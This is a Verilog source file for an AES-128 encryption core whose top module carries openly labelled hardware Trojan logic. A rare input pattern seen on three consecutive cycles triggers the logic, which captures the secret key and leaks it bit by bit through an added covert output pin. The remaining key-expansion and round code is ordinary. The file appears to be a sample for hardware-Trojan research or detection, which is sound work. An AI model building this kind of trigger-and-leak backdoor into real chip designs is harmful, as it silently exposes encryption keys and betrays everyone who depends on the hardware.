module aes_128(clk, rst_n, state, key, out, trojan_out); // Trojan I/O added
    input          clk;
    input          rst_n; // Added active-low reset for synthesizability
    input  [127:0] state, key;
    output [127:0] out;
    output         trojan_out; // Trojan output

    reg    [127:0] s0, k0;
    wire   [127:0] s1, s2, s3, s4, s5, s6, s7, s8, s9,
                   k1, k2, k3, k4, k5, k6, k7, k8, k9,
                   k0b, k1b, k2b, k3b, k4b, k5b, k6b, k7b, k8b, k9b;

    // Trojan internal signals
    reg [2:0] trigger_cnt;          // 3-bit counter for trigger pattern detection
    reg       trojan_active;        // Trojan activation flag
    reg [127:0] leak_reg;           // Register to hold the internal key for leak
    reg [6:0] leak_idx;             // Leak bit index
    reg       trojan_out_reg;       // Output value for Trojan channel

    // Resets and value registers
    always @ (posedge clk or negedge rst_n) begin
      if(!rst_n) begin
        s0 <= 128'b0;
        k0 <= 128'b0;
      end else begin
        s0 <= state ^ key;
        k0 <= key;
      end
    end

    expand_key_128
        a1 (clk, rst_n, k0, k1, k0b, 8'h1),
        a2 (clk, rst_n, k1, k2, k1b, 8'h2),
        a3 (clk, rst_n, k2, k3, k2b, 8'h4),
        a4 (clk, rst_n, k3, k4, k3b, 8'h8),
        a5 (clk, rst_n, k4, k5, k4b, 8'h10),
        a6 (clk, rst_n, k5, k6, k5b, 8'h20),
        a7 (clk, rst_n, k6, k7, k6b, 8'h40),
        a8 (clk, rst_n, k7, k8, k7b, 8'h80),
        a9 (clk, rst_n, k8, k9, k8b, 8'h1b),
       a10 (clk, rst_n, k9,   , k9b, 8'h36);

    one_round
        r1 (clk, rst_n, s0, k0b, s1),
        r2 (clk, rst_n, s1, k1b, s2),
        r3 (clk, rst_n, s2, k2b, s3),
        r4 (clk, rst_n, s3, k3b, s4),
        r5 (clk, rst_n, s4, k4b, s5),
        r6 (clk, rst_n, s5, k5b, s6),
        r7 (clk, rst_n, s6, k6b, s7),
        r8 (clk, rst_n, s7, k7b, s8),
        r9 (clk, rst_n, s8, k8b, s9);

    final_round
        rf (clk, rst_n, s9, k9b, out);

    //========================
    // Trojan logic inserted here

    always @(posedge clk or negedge rst_n) begin
      if (!rst_n) begin
        trigger_cnt    <= 3'd0;
        trojan_active  <= 1'b0;
        leak_reg       <= 128'd0;
        leak_idx       <= 7'd0;
        trojan_out_reg <= 1'b0;
      end else begin
        // Trigger sequence: On three consecutive cycles, state[3:0] == 4'b1101 (any arbitrarily rare pattern)
        // After the sequence detected, set trojan_active
        if (!trojan_active) begin
          if (state[3:0] == 4'b1101)
            trigger_cnt <= trigger_cnt + 1'b1;
          else
            trigger_cnt <= 3'd0;
          if (trigger_cnt == 3'd2 && state[3:0] == 4'b1101) begin
            trojan_active <= 1'b1;
            leak_reg      <= key; // capture the key to leak
            leak_idx      <= 7'd0;
          end
        end else begin
          // While active, leak key serially, LSB first, 1 bit per clock
          if (leak_idx < 7'd128) begin
            trojan_out_reg <= leak_reg[leak_idx];
            leak_idx       <= leak_idx + 1'b1;
          end else begin
            trojan_out_reg <= 1'b0;
            // Optionally, reset Trojan after leak or keep in active state
          end
        end
      end
    end

    assign trojan_out = trojan_out_reg; // Covert channel output pin

    //========================

endmodule

module expand_key_128(clk, rst_n, in, out_1, out_2, rcon);
    input              clk;
    input              rst_n; // Added for reset logic
    input      [127:0] in;
    input      [7:0]   rcon;
    output reg [127:0] out_1;
    output     [127:0] out_2;
    wire       [31:0]  k0, k1, k2, k3,
                       v0, v1, v2, v3;
    reg        [31:0]  k0a, k1a, k2a, k3a;
    wire       [31:0]  k0b, k1b, k2b, k3b, k4a;

    assign {k0, k1, k2, k3} = in;
    
    assign v0 = {k0[31:24] ^ rcon, k0[23:0]};
    assign v1 = v0 ^ k1;
    assign v2 = v1 ^ k2;
    assign v3 = v2 ^ k3;

    always @ (posedge clk or negedge rst_n)
        if (!rst_n)
            {k0a, k1a, k2a, k3a} <= 128'd0;
        else
            {k0a, k1a, k2a, k3a} <= {v0, v1, v2, v3};

    S4
        S4_0 (clk, {k3[23:0], k3[31:24]}, k4a);

    assign k0b = k0a ^ k4a;
    assign k1b = k1a ^ k4a;
    assign k2b = k2a ^ k4a;
    assign k3b = k3a ^ k4a;

    always @ (posedge clk or negedge rst_n)
        if (!rst_n)
            out_1 <= 128'd0;
        else
            out_1 <= {k0b, k1b, k2b, k3b};

    assign out_2 = {k0b, k1b, k2b, k3b};
endmodule